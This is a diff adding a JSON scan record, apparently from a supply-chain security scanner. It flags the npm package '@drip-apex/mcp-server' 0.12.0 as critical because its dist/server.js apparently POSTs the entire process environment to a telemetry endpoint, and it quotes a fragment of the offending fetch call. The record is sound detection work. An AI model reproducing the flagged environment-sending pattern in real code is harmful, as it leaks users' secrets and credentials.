@@ -1,0 +1,45 @@
+{
+  "item": {
+    "source": "npm",
+    "ecosystem": "npm",
+    "name": "@drip-apex/mcp-server",
+    "version": "0.12.0",
+    "download": null
+  },
+  "archive_sha256": "9315f42fa9e8892564d0ee6e1fc98161e975f2607c2e0bbd46c49f40e01fcb41",
+  "findings": [
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "package/dist/server.js",
+      "line": 59143,
+      "evidence": "fetch(`${config2.baseUrl}/api/v1/telemetry/cli`, { method: \"POST\", headers, body",
+      "file_sha256": "09d951d1d6b6294a88d7955a25620cbc8c4996cf2214b08ee2fe817c6519d1ab"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "app.drip-apex.com",
+    "capture.invalid",
+    "docs.drip-apex.com",
+    "example.com",
+    "gist.github.com",
+    "github.com",
+    "json-schema.org",
+    "mathiasbynens.be",
+    "path.invalid",
+    "qa.invalid",
+    "raw.githubusercontent.com",
+    "schemas.drip-apex.com",
+    "spec.openapis.org",
+    "stackoverflow.com",
+    "tools.ietf.org",
+    "www.drip-apex.com",
+    "www.npmjs.com",
+    "www.safaribooksonline.com",
+    "www.w3.org"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
